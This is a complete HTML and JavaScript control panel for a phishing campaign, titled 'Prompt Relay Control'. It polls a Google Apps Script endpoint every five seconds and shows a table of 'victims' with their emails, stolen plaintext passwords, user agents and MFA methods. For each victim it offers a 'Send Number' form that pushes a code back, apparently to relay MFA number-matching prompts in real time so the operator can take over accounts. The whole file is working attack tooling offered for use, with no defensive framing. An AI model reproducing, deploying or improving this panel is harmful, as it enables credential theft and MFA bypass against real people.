<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Prompt Relay Control</title>
  <link rel="stylesheet" href="style.css">
</head>
<body class="dark-theme">
  <div class="container">
    <h1>Prompt Relay Control</h1>
    <div id="status" class="fetching">Fetching victims...</div>
    <div id="raw-response"><strong>Raw response from script:</strong><br>(nothing received yet)</div>

    <table id="victims-table" style="display:none;">
      <thead>
        <tr>
          <th>Timestamp</th>
          <th>Email</th>
          <th>Status</th>
          <th>User Agent</th>
          <th>Password</th>
          <th>Method</th>
          <th>Alt Code</th>
          <th>Send Number</th>
        </tr>
      </thead>
      <tbody id="victims-body"></tbody>
    </table>

    <div id="last-update-container" style="margin-top: 2rem; color: #8b949e; font-size: 0.95rem;">
      Last update: <span id="last-update">—</span> • Polling every 5 seconds
    </div>
  </div>

  <script>
    // same control.js script as before (no change needed)
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxUBfTv-NSz4B-L_Z_LvAbaTOnkPtxtxaA1rPMKuvkB51ZLgmrJHQqfK8505j2RwUaz/exec";
    const statusEl = document.getElementById('status');
    const rawEl = document.getElementById('raw-response');
    const tableEl = document.getElementById('victims-table');
    const tbodyEl = document.getElementById('victims-body');
    const lastUpdateEl = document.getElementById('last-update');

    const typedCodes = new Map();

    async function fetchVictims() {
      statusEl.textContent = "Fetching victims...";
      statusEl.className = "fetching";

      try {
        const res = await fetch(`${SCRIPT_URL}?getVictims=true`, { cache: 'no-cache' });
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const text = await res.text();
        rawEl.innerHTML = `<strong>Raw response:</strong><br>${escapeHtml(text || '(empty)')}`;

        const victims = JSON.parse(text);
        if (victims.length > 0) {
          renderVictims(victims);
        } else {
          showEmpty("No ready victims found");
        }
      } catch (err) {
        statusEl.textContent = `Error: ${err.message}`;
        statusEl.className = "error";
      }
    }

    function renderVictims(items) {
      document.querySelectorAll('.code-input').forEach(inp => {
        const val = inp.value.trim();
        if (val) typedCodes.set(inp.dataset.email, val);
      });

      tbodyEl.innerHTML = '';
      items.forEach(item => {
        const email = item.email;
        const saved = typedCodes.get(email) || '';
        const tr = document.createElement('tr');
        tr.innerHTML = `
          <td data-label="Timestamp">${escapeHtml(item.timestamp)}</td>
          <td data-label="Email">${escapeHtml(item.email)}</td>
          <td data-label="Status">${escapeHtml(item.status || 'victim_ready')}</td>
          <td data-label="User Agent" title="${escapeHtml(item.user_agent)}">${escapeHtml(item.user_agent?.slice(0,60) || '—')}${item.user_agent?.length > 60 ? '...' : ''}</td>
          <td data-label="Password">${escapeHtml(item.password || '—')}</td>
          <td data-label="Method">${escapeHtml(item.method || '—')}</td>
          <td data-label="Alt Code">${escapeHtml(item.alt_code || '—')}</td>
          <td data-label="Send Number">
            <input type="text" class="code-input" placeholder="Enter number" data-email="${escapeHtml(email)}" value="${escapeHtml(saved)}">
            <button class="send-btn" data-email="${escapeHtml(email)}">Send</button>
          </td>
        `;
        tbodyEl.appendChild(tr);
      });

      tableEl.style.display = 'table';
      statusEl.textContent = `Connected victims: ${items.length}`;
      statusEl.className = "success";
      lastUpdateEl.textContent = new Date().toLocaleTimeString();
    }

    function showEmpty(msg) {
      statusEl.textContent = msg;
      statusEl.className = "empty";
      tableEl.style.display = 'none';
      lastUpdateEl.textContent = new Date().toLocaleTimeString();
    }

    function escapeHtml(unsafe) {
      return unsafe.replace(/[&<>"']/g, m => ({ '&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;', "'":'&#039;' })[m]);
    }

    document.addEventListener('click', async e => {
      if (!e.target.classList.contains('send-btn')) return;
      const btn = e.target;
      const email = btn.dataset.email;
      const input = document.querySelector(`.code-input[data-email="${escapeHtml(email)}"]`);
      const code = input?.value.trim();
      if (!code) return alert("Enter a number first");
      if (!confirm(`Send "${code}" to ${email}?`)) return;

      btn.disabled = true;
      btn.textContent = "Sending...";

      try {
        const formData = new URLSearchParams({ action: 'set_number', email, prompt_number: code });
        const res = await fetch(SCRIPT_URL, { method: 'POST', body: formData, cache: 'no-cache' });
        const txt = await res.text();
        if (txt.includes('"success":true')) {
          alert(`Sent "${code}"`);
          input.value = '';
          typedCodes.delete(email);
        } else {
          alert(`Failed: ${txt || res.status}`);
        }
      } catch (err) {
        alert("Error: " + err.message);
      } finally {
        btn.disabled = false;
        btn.textContent = "Send";
      }
    });

    fetchVictims();
    setInterval(fetchVictims, 5000);
  </script>
</body>
</html>
